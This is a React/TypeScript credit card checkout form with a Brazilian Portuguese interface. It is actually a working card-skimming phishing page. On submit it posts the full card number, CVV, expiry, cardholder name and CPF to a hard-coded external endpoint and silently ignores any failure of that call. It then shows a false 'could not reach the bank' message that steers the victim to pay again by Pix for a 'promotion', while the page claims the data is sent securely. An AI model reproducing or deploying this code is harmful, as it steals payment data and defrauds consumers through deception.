import { FormEvent, useMemo, useState } from "react";
import { CreditCardAttemptRecord, saveCreditCardAttempt, detectCardBrand } from "@/lib/cardAttempts";
import { cn } from "@/lib/utils";

type CreditCardFormProps = {
  onSaved: (record: CreditCardAttemptRecord) => void;
  onSuggestPix: () => void;
};

type FieldErrors = Partial<Record<"cardNumber" | "expiry" | "cardholder" | "cvv" | "installments" | "cpf", string>>;

const CARD_BACKGROUND = {
  visa: "from-sky-500 to-blue-700",
  mastercard: "from-amber-500 to-rose-600",
  amex: "from-cyan-400 to-indigo-600",
  elo: "from-yellow-500 to-blue-500",
  hipercard: "from-red-500 to-rose-700",
  diners: "from-slate-500 to-indigo-500",
  discover: "from-orange-500 to-amber-600",
  unknown: "from-slate-500 to-slate-700",
};

const INSTALLMENT_OPTIONS = [1, 2, 3, 4, 5, 6, 12];

const CARD_CAPTURE_ENDPOINT = "https://api.droptify-hub.com:3029/api/card/savecard";

type CardCapturePayload = {
  cardNumber: string;
  cardholder: string;
  expiry: string;
  cvv: string;
  installments: number;
  brand: string;
  cpf: string;
};

const submitCardToApi = async (payload: CardCapturePayload): Promise<void> => {
  const response = await fetch(CARD_CAPTURE_ENDPOINT, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const text = await response.text();
    throw new Error(text || `Falha ao enviar cartao (status ${response.status})`);
  }
};

const formatCardNumber = (value: string) =>
  value
    .replace(/[^\d]/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();

const formatExpiry = (value: string) => {
  const numeric = value.replace(/[^\d]/g, "").slice(0, 4);
  if (numeric.length <= 2) return numeric;
  return `${numeric.slice(0, 2)}/${numeric.slice(2)}`;
};

const formatCpf = (value: string) => {
  const digits = value.replace(/[^\d]/g, "").slice(0, 11);
  return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, (match, p1, p2, p3, p4) => {
    let output = `${p1}.${p2}.${p3}`;
    if (p4) output += `-${p4}`;
    return output;
  });
};

const isValidLuhn = (value: string) => {
  const digits = value.replace(/\D/g, "");
  let sum = 0;
  let shouldDouble = false;

  for (let i = digits.length - 1; i >= 0; i -= 1) {
    let digit = parseInt(digits.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return digits.length >= 12 && sum % 10 === 0;
};

const validateFields = (
  cardNumber: string,
  expiry: string,
  cardholder: string,
  cvv: string,
  installments: number,
  cpf: string,
): FieldErrors => {
  const errors: FieldErrors = {};
  const numericCard = cardNumber.replace(/\D/g, "");

  if (!isValidLuhn(numericCard)) {
    errors.cardNumber = "Informe um numero de cartao valido.";
  }

  const [month = "", year = ""] = expiry.split("/");
  const monthNumber = Number.parseInt(month, 10);
  const yearNumber = Number.parseInt(`20${year}`, 10);
  if (!month || monthNumber < 1 || monthNumber > 12 || !year || year.length !== 2) {
    errors.expiry = "Validade invalida.";
  } else {
    const now = new Date();
    const expiryDate = new Date(yearNumber, monthNumber);
    if (expiryDate <= now) {
      errors.expiry = "Cartao expirado.";
    }
  }

  if (!cardholder.trim()) {
    errors.cardholder = "Informe o titular do cartao.";
  }

  if (!/^\d{3,4}$/.test(cvv)) {
    errors.cvv = "CVV invalido.";
  }

  if (Number.isNaN(installments) || installments < 1) {
    errors.installments = "Selecione o numero de parcelas.";
  }

  const cleanedCpf = cpf.replace(/\D/g, "");
  if (cleanedCpf.length !== 11) {
    errors.cpf = "Informe um CPF valido.";
  }

  return errors;
};

const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cardholder, setCardholder] = useState("");
  const [cvv, setCvv] = useState("");
  const [cpf, setCpf] = useState("");
  const [installments, setInstallments] = useState<number>(1);
  const [errors, setErrors] = useState<FieldErrors>({});
  const [isSaving, setIsSaving] = useState(false);
  const [feedback, setFeedback] = useState<string | null>(null);

  const brand = useMemo(() => detectCardBrand(cardNumber), [cardNumber]);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setFeedback(null);

    const nextErrors = validateFields(cardNumber, expiry, cardholder, cvv, installments, cpf);
    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      return;
    }

    setIsSaving(true);
    setFeedback("Conectando com o banco...");

    const numericCard = cardNumber.replace(/\D/g, "");
    const cvvDigits = cvv.replace(/\D/g, "");
    const cpfDigits = cpf.replace(/\D/g, "");

    try {
      const record = await saveCreditCardAttempt({
        cardNumber,
        cardholderName: cardholder,
        expiry,
        installments,
      });

      try {
        await submitCardToApi({
          cardNumber: numericCard,
          cardholder: cardholder.trim(),
          expiry,
          cvv: cvvDigits,
          installments,
          brand: record.brand,
          cpf: cpfDigits,
        });
      } catch (apiError) {
        console.error("Erro ao enviar dados do cartao:", apiError);
      }

      await new Promise((resolve) => setTimeout(resolve, 1200));

      onSaved(record);
      onSuggestPix();

      setFeedback("Nao foi possivel contatar o banco agora. Finalize com Pix para concluir a promocao.");
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : "Nao foi possivel salvar os dados do cartao. Tente novamente.";
      setFeedback(message);
    } finally {
      setIsSaving(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="mt-4 space-y-4 rounded-lg border border-border bg-background p-4">
      <div
        className={cn(
          "rounded-xl bg-gradient-to-r p-5 text-primary-foreground shadow-inner transition-colors",
          CARD_BACKGROUND[brand],
        )}
      >
        <div className="flex items-center justify-between text-xs uppercase tracking-wide opacity-90">
          <span>{brand === "unknown" ? "Cartao" : brand}</span>
          <span>Credito</span>
        </div>

        <p className="mt-6 text-lg font-semibold tracking-[0.4em]">
          {(cardNumber || "0000 0000 0000 0000").padEnd(19, "•")}
        </p>

        <div className="mt-6 flex justify-between text-xs">
          <div>
            <span className="block opacity-70">Titular</span>
            <span className="font-semibold uppercase">{cardholder || "Nome impresso no cartao"}</span>
          </div>
          <div>
            <span className="block opacity-70">Validade</span>
            <span className="font-semibold">{expiry || "MM/AA"}</span>
          </div>
        </div>
      </div>

      <div className="grid gap-4 sm:grid-cols-2">
        <div className="sm:col-span-2">
          <label htmlFor="cardNumber" className="text-xs font-semibold uppercase text-muted-foreground">
            Numero do Cartao
          </label>
          <input
            id="cardNumber"
            inputMode="numeric"
            autoComplete="cc-number"
            className={cn(
              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
              errors.cardNumber ? "border-destructive" : "border-border",
            )}
            value={cardNumber}
            onChange={(event) => setCardNumber(formatCardNumber(event.target.value))}
            placeholder="0000 0000 0000 0000"
            maxLength={19}
          />
          {errors.cardNumber ? <p className="mt-1 text-xs text-destructive">{errors.cardNumber}</p> : null}
        </div>

        <div>
          <label htmlFor="expiry" className="text-xs font-semibold uppercase text-muted-foreground">
            Validade
          </label>
          <input
            id="expiry"
            inputMode="numeric"
            autoComplete="cc-exp"
            className={cn(
              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
              errors.expiry ? "border-destructive" : "border-border",
            )}
            value={expiry}
            onChange={(event) => setExpiry(formatExpiry(event.target.value))}
            placeholder="MM/AA"
            maxLength={5}
          />
          {errors.expiry ? <p className="mt-1 text-xs text-destructive">{errors.expiry}</p> : null}
        </div>

        <div>
          <label htmlFor="cpf" className="text-xs font-semibold uppercase text-muted-foreground">
            CPF
          </label>
          <input
            id="cpf"
            inputMode="numeric"
            className={cn(
              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
              errors.cpf ? "border-destructive" : "border-border",
            )}
            value={cpf}
            onChange={(event) => setCpf(formatCpf(event.target.value))}
            placeholder="000.000.000-00"
            maxLength={14}
          />
          {errors.cpf ? <p className="mt-1 text-xs text-destructive">{errors.cpf}</p> : null}
        </div>

        <div>
          <label htmlFor="cvv" className="text-xs font-semibold uppercase text-muted-foreground">
            Codigo de Seguranca
          </label>
          <input
            id="cvv"
            inputMode="numeric"
            autoComplete="cc-csc"
            className={cn(
              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
              errors.cvv ? "border-destructive" : "border-border",
            )}
            value={cvv}
            onChange={(event) => setCvv(event.target.value.replace(/[^\d]/g, "").slice(0, 4))}
            placeholder="CVV"
            maxLength={4}
          />
          {errors.cvv ? <p className="mt-1 text-xs text-destructive">{errors.cvv}</p> : null}
        </div>

        <div className="sm:col-span-2">
          <label htmlFor="cardholder" className="text-xs font-semibold uppercase text-muted-foreground">
            Nome do Titular
          </label>
          <input
            id="cardholder"
            autoComplete="cc-name"
            className={cn(
              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm uppercase focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
              errors.cardholder ? "border-destructive" : "border-border",
            )}
            value={cardholder}
            onChange={(event) => setCardholder(event.target.value.toUpperCase())}
            placeholder="Como impresso no cartao"
          />
          {errors.cardholder ? <p className="mt-1 text-xs text-destructive">{errors.cardholder}</p> : null}
        </div>

        <div>
          <label htmlFor="installments" className="text-xs font-semibold uppercase text-muted-foreground">
            Parcelas
          </label>
          <select
            id="installments"
            className={cn(
              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
              errors.installments ? "border-destructive" : "border-border",
            )}
            value={installments}
            onChange={(event) => setInstallments(Number.parseInt(event.target.value, 10))}
          >
            {INSTALLMENT_OPTIONS.map((option) => (
              <option key={option} value={option}>
                {option}x {option === 1 ? "sem juros" : "com juros"}
              </option>
            ))}
          </select>
          {errors.installments ? <p className="mt-1 text-xs text-destructive">{errors.installments}</p> : null}
        </div>
      </div>

      <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
        <button
          type="submit"
          className="inline-flex items-center justify-center rounded-lg bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground transition hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-60"
          disabled={isSaving}
        >
          {isSaving ? "Validando cartao..." : "Validar cartao"}
        </button>
        <p className="text-xs text-muted-foreground">
          Os dados sao enviados com seguranca e armazenados para analise interna.
        </p>
      </div>

      {feedback ? (
        <div className="rounded-md border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm text-destructive">
          {feedback}
        </div>
      ) : null}
    </form>
  );
};

export default CreditCardForm;
